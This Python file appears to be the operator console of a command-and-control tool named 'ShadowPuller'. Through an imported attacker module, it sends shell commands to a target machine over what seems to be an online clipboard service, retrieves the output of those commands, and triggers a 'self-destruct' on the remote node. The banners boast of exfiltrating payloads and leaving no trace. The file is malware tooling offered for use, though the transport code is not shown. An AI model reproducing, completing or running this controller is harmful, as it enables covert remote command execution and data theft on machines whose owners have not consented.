from attacker import attacker
import datetime
import socket
import time

def banner():
    ORANGE = '\033[38;5;208m'  # Flame orange
    RESET = '\033[0m'
    WHITE = '\033[97m'
    DIM = '\033[38;5;240m'

    banner = (
        ORANGE +
        r""" (                                   (                            
 )\ )    )         (                 )\ )       (   (             
(()/( ( /(     )   )\ )      (  (   (()/(   (   )\  )\   (   (    
 /(_)))\()) ( /(  (()/(  (   )\))(   /(_)) ))\ ((_)((_) ))\  )(   
(_)) ((_)\  )(_))  ((_)) )\ ((_)()\ (_))  /((_) _   _  /((_)(()\  """ +
        WHITE +
        r"""
/ __|| |(_)((_)_   _| | ((_)_(()((_)| _ \(_))( | | | |(_))   ((_) 
\__ \| ' \ / _` |/ _` |/ _ \\ V  V /|  _/| || || | | |/ -_) | '_| 
|___/|_||_|\__,_|\__,_|\___/ \_/\_/ |_|   \_,_||_| |_|\___| |_|""" +
        DIM +
        "\n\n                       Pulling strings from the shadows...\n" +
        RESET
    )

    print(banner)

    env_hostname = socket.gethostname()
    env_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print(f"{DIM}:: Environment :: {RESET}")
    print(f"{WHITE}    ↪ Host ID     : {env_hostname}")
    print(f"    ↪ Timestamp   : {env_time}")
    print(f"    ↪ Role        : C2 Operator")
    print(f"    ↪ Mode        : Stealth Relay {RESET}\n")

def exit_banner():
    banner = """
[!] Transmission terminated.
[✓] ShadowPuller has exfiltrated the last payload.
[~] Trails wiped. No trace left behind.
[×] Connection to command channel closed.

 ▄▄▄▄   ▓█████  █     █░ ▄▄▄       ██▀███  ▓█████ 
▓█████▄ ▓█   ▀ ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
▒██▒ ▄██▒███   ▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
▒██░█▀  ▒▓█  ▄ ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
░▓█  ▀█▓░▒████▒░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
░▒▓███▀▒░░ ▒░ ░░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
▒░▒   ░  ░ ░  ░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
 ░    ░    ░     ░   ░    ░   ▒     ░░   ░    ░   
 ░         ░  ░    ░          ░  ░   ░        ░  ░
      ░                                           

     - "In the shadows we pull. In silence we vanish." -

Exiting...
"""
    print(banner)



def menu() -> int:
    print("\n" + "-" * 55)
    print("🔧  ShadowPuller Command & Control Interface")
    print("-" * 55)
    print("[1] 📤 Upload & Deploy Payload")
    print("[2] 📥 Retrieve Field Intel (Command Output)")
    print("[3] 💣 Initiate Self-Destruct Protocol")
    print("[4] 🚪 Disengage & Exit Operation")
    print("-" * 55)

    try:
        user_input = int(input("💻 Your Directive [1-4]: "))
        if user_input in range(1, 5):
            return user_input
        else:
            print("⚠ Invalid choice. Stay hidden. Try again.\n")
            return 0
    except ValueError:
        print("⚠ Input Error. Expecting numeric directive.\n")
        return 0



def main():
    while True:
        choice = menu()
        if choice:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if choice == 1:
                print(f"[{timestamp}] ⛓ Initiating payload delivery sequence...")
                command = input("📥 Input command to deploy: ")

                if attacker.push_to_klipit(command):
                    print(f"[{timestamp}] ✅ Command exfiltrated to target node.")
                else:
                    print(f"[{timestamp}] ❌ Transmission failed. Retrying advised.")
            
            elif choice == 2:
                print(f"[{timestamp}] 🔍 Retrieving command output from the field...")
                result = attacker.fetch_clipboard_data()
                
                if result:
                    print(f"[{timestamp}] 📄 Output secured → saved as 'command_outputs.txt'")
                else:
                    print(f"[{timestamp}] ⚠ No trace recovered. Output fetch unsuccessful.")
            
            elif choice == 3:
                print(f"[{timestamp}] 💣 Triggering silent self-destruct protocol...")

                if attacker.push_to_klipit("break"):
                    print(f"[{timestamp}] ☠ ShadowPuller node is set to vanish.")
                    time.sleep(4)
                    attacker.push_to_klipit("")
                else:
                    print(f"[{timestamp}] ❌ Abort failed. 'break' signal lost in transit.")
            
            elif choice == 4:
                print(f"[{timestamp}] 📴 Finalizing session & disengaging from command grid...")
                attacker.push_to_klipit("break")
                time.sleep(4)
                attacker.push_to_klipit("")
                break

        else:
            print("🔁 Invalid selection. Looping back to command module...")




if __name__ == '__main__':

    banner()
    main()
    exit_banner()


   
